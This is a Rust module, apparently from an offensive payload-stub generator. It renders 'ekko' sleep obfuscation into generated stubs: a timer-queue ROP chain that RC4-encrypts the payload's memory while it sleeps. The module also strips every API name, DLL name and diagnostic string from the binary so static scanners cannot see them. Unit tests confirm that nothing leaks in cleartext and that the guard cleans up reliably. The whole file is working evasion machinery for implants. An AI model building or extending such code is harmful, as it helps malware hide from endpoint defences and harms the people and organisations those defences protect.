//! Shared sleep-obfuscation runtime (ekko) rendered into the generated stub.
//!
//! The mechanism was extracted from the `sleep_obfuscation` technique fragment
//! so one implementation can serve both the preparation step and the `Sleep`
//! API proxy. Rendering it once keeps the ROP chain, the RC4 key and the
//! measurements in a single place.
//!
//! The block is emitted only when a caller needs it. [`render_block`] bakes in a
//! per-build RC4 key (derived from the strings key) and rebuilds every
//! diagnostic string through [`StringsConfig`], so no resolved name or message
//! reaches the stub in cleartext.

use crate::engine::api_resolution::ApiResolutionConfig;
use crate::engine::obfuscation::StringsConfig;
use crate::techniques::{RuntimeStep, TechniqueKind};

/// The generated block: a crate-level `mod sleep_runtime`.
const BLOCK: &str = include_str!("templates/sleep_runtime.rs.tpl");

/// Runtime diagnostics, as `(placeholder, plaintext)` pairs.
///
/// Every message is rebuilt at runtime through [`StringsConfig`], so no
/// diagnostic text — least of all a technique keyword — lands in the generated
/// stub's `.rdata`.
const MESSAGES: &[(&str, &str)] = &[
    (
        "$MSG_CAPTURE_CONTEXT_FAILED$",
        "could not capture a timer-thread context",
    ),
    (
        "$MSG_CREATE_TIMER_QUEUE_FAILED$",
        "could not create the timer queue",
    ),
    (
        "$MSG_CREATE_TIMER_QUEUE_TIMER_FAILED$",
        "could not queue a timer",
    ),
    (
        "$MSG_VIRTUAL_QUERY_FAILED$",
        "could not walk the image memory",
    ),
    (
        "$MSG_VIRTUAL_PROTECT_FAILED$",
        "could not change the image memory protection",
    ),
    (
        "$MSG_CRYPT_FUNCTION_NOT_FOUND$",
        "could not resolve the RC4 system function",
    ),
    (
        "$MSG_CRYPT_FUNCTION_FAILED$",
        "the RC4 system function failed",
    ),
    (
        "$MSG_NO_TARGET_REGIONS$",
        "no committed region of the image to encrypt",
    ),
];

/// The RC4 key for the sleep region.
///
/// The first 16 bytes of the strings key are already per-build (and reproduced
/// from the master entropy). The stack strategy carries no key, so it uses a
/// fixed constant: its literals are rebuilt on the stack and this key never
/// reaches the artifact in cleartext either way.
fn sleep_key(strings: &StringsConfig) -> [u8; 16] {
    const FALLBACK: [u8; 16] = *b"picaro-sleep-key";
    let mut key = FALLBACK;
    if let Some(source) = strings.key {
        key.copy_from_slice(&source[..16]);
    }
    key
}

/// Whether the build needs the shared runtime: the preparation step or the
/// `Sleep` API hook.
pub fn needed(steps: &[RuntimeStep], api_resolution: &ApiResolutionConfig) -> bool {
    api_resolution.hooks.sleep.is_some()
        || steps
            .iter()
            .any(|step| matches!(step.technique, TechniqueKind::SleepObfuscation { .. }))
}

/// Renders the shared block with a per-build RC4 key and obfuscated diagnostics.
pub fn render_block(strings: &StringsConfig) -> String {
    // The sleeping region is RC4-encrypted with a per-build key; its hex form is
    // rebuilt at runtime through `strings`, so it never lands in cleartext in
    // the generated stub. The key derives from the strings key (itself derived
    // from the build entropy) so a replay reproduces the block.
    let key = sleep_key(strings);
    let key_def = strings
        .obfuscate(&hex::encode(key))
        .render_stub_expr("sleep_key");
    let mut block = BLOCK.replace("$SLEEP_KEY_DEF$", &key_def);

    for (index, (placeholder, text)) in MESSAGES.iter().enumerate() {
        block = block.replace(
            placeholder,
            &strings
                .obfuscate(text)
                .render_stub_expr(&format!("sleep_msg_{index}")),
        );
    }

    // Every resolved API and DLL name is rebuilt at runtime, exactly as the
    // technique fragment did before the extraction.
    let substitutions: [(&str, &str, &str); 12] = [
        ("$KERNEL32_DLL_DEF$", "kernel32.dll", "kernel32_dll"),
        ("$NTDLL_DLL_DEF$", "ntdll.dll", "ntdll_dll"),
        ("$ADVAPI32_DLL_DEF$", "advapi32.dll", "advapi32_dll"),
        (
            "$CREATE_TIMER_QUEUE_DEF$",
            "CreateTimerQueue",
            "create_timer_queue",
        ),
        (
            "$CREATE_TIMER_QUEUE_TIMER_DEF$",
            "CreateTimerQueueTimer",
            "create_timer_queue_timer",
        ),
        (
            "$DELETE_TIMER_QUEUE_EX_DEF$",
            "DeleteTimerQueueEx",
            "delete_timer_queue_ex",
        ),
        (
            "$WAIT_FOR_SINGLE_OBJECT_DEF$",
            "WaitForSingleObject",
            "wait_for_single_object",
        ),
        ("$SET_EVENT_DEF$", "SetEvent", "set_event"),
        ("$VIRTUAL_PROTECT_DEF$", "VirtualProtect", "virtual_protect"),
        (
            "$RTL_CAPTURE_CONTEXT_DEF$",
            "RtlCaptureContext",
            "rtl_capture_context",
        ),
        ("$NT_CONTINUE_DEF$", "NtContinue", "nt_continue"),
        (
            "$SYSTEM_FUNCTION_032_DEF$",
            "SystemFunction032",
            "system_function_032",
        ),
    ];
    for (placeholder, name, var) in substitutions {
        block = block.replace(placeholder, &strings.obfuscate(name).render_stub_expr(var));
    }

    block
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::techniques::sleep_obfuscation::{EncryptRegion, Params, Variant};

    fn xor_strings() -> StringsConfig {
        StringsConfig::from_yaml(None).expect("default strings")
    }

    /// Drops comments so a doc comment that *names* a forbidden construct is
    /// not mistaken for a use of it.
    fn code_only(source: &str) -> String {
        source
            .lines()
            .filter(|line| !line.trim_start().starts_with("//"))
            .collect::<Vec<_>>()
            .join("\n")
    }

    fn sleep_step() -> RuntimeStep {
        RuntimeStep::new(TechniqueKind::SleepObfuscation {
            params: Params {
                variant: Variant::Ekko,
                sleep_ms: 5000,
                encrypt_regions: vec![EncryptRegion::Payload],
            },
        })
    }

    #[test]
    fn needed_with_the_technique_or_the_hook() {
        let none = ApiResolutionConfig::default();
        assert!(needed(&[sleep_step()], &none));
        assert!(!needed(&[], &none));
        let other = RuntimeStep::new(TechniqueKind::ReflectiveLoading {
            params: crate::techniques::reflective_loading::Params::default(),
        });
        assert!(!needed(&[other], &none));

        let hooked = ApiResolutionConfig {
            hooks: crate::engine::api_resolution::HooksConfig {
                sleep: Some(crate::engine::api_resolution::SleepHookConfig {
                    min_ms: 1000,
                    max_ms: 600_000,
                }),
            },
            ..ApiResolutionConfig::default()
        };
        assert!(needed(&[], &hooked));
    }

    #[test]
    fn renders_a_complete_block_without_placeholders() {
        let block = render_block(&xor_strings());
        assert!(block.contains("mod sleep_runtime {"), "{block}");
        assert!(block.contains("pub fn ekko_sleep("), "{block}");
        assert!(block.contains("pub fn current_image("), "{block}");
        assert!(!block.contains('$'), "unsubstituted placeholder: {block}");
        // The proxy path runs this block on payload threads: it must not touch
        // the stub's thread-local debug machinery.
        let code = code_only(&block);
        assert!(!code.contains("tech_dbg"), "the block traces: {code}");
        assert!(!code.contains("thread_local"), "the block uses TLS: {code}");
    }

    #[test]
    fn rendered_block_owns_the_event_and_queue_through_a_guard() {
        let block = render_block(&xor_strings());
        let code = code_only(&block);
        assert!(code.contains("struct EkkoCleanup"), "{code}");
        assert!(code.contains("impl Drop for EkkoCleanup"), "{code}");
        // The queue is deleted first (waiting for in-flight callbacks) and the
        // event is closed afterwards, on every path.
        assert!(code.contains("CloseHandle(self.event)"), "{code}");
        assert!(code.contains("(self.delete)(queue, -1)"), "{code}");
        // `DeleteTimerQueueEx` is required, not best-effort: a queue that
        // cannot be cancelled must never be created.
        assert!(
            code.contains("let delete_timer_queue_ex: FnDeleteTimerQueueEx = resolve_as("),
            "{code}"
        );
        // Both teardown steps are idempotent, so the explicit success path and
        // `Drop` cannot delete the queue or close the event twice.
        assert!(code.contains("if self.queue_deleted"), "{code}");
        assert!(code.contains("if self.event_closed"), "{code}");
        // The proxy runs this block on payload threads: no panicking paths.
        assert!(!code.contains(".unwrap("), "{code}");
        assert!(!code.contains(".expect("), "{code}");
    }

    #[test]
    fn cleanup_guard_is_armed_before_the_chain_and_finished_on_success() {
        let block = render_block(&xor_strings());

        // The guard exists before the queue handle can fail and before the
        // first timer is queued, so every `?` between them closes the event.
        let armed = block
            .find("let mut cleanup = EkkoCleanup::new(h_event")
            .expect("guard construction");
        let queue_error = block.find("if h_queue == 0").expect("queue error path");
        let first_timer = armed
            + block[armed..]
                .find("queue_timer(")
                .expect("first queued timer");
        assert!(
            armed < queue_error,
            "the queue error path must close the event"
        );
        assert!(queue_error < first_timer, "{block}");

        // Success: wait for completion, delete the queue (waits), close the
        // event, then return.
        let wait = block
            .rfind("wait_for_single_object(h_event.0 as isize, u32::MAX)")
            .expect("completion wait");
        let delete = block
            .rfind("cleanup.delete_queue()")
            .expect("queue teardown");
        let close = block
            .rfind("cleanup.close_event()")
            .expect("event teardown");
        let done = block.rfind("Ok(())").expect("success return");
        assert!(wait < delete && delete < close && close < done, "{block}");
    }

    #[test]
    fn no_resolved_name_or_message_leaks_in_cleartext() {
        let block = render_block(&xor_strings());
        for name in [
            "kernel32.dll",
            "ntdll.dll",
            "advapi32.dll",
            "CreateTimerQueue",
            "CreateTimerQueueTimer",
            "DeleteTimerQueueEx",
            "WaitForSingleObject",
            "SetEvent",
            "VirtualProtect",
            "RtlCaptureContext",
            "NtContinue",
            "SystemFunction032",
        ] {
            assert!(
                !block.contains(&format!("\"{name}\"")),
                "cleartext literal leaked: {name}"
            );
        }
        for (_, text) in MESSAGES {
            assert!(
                !block.contains(text),
                "a diagnostic message leaked in cleartext: {text}"
            );
        }
    }
}
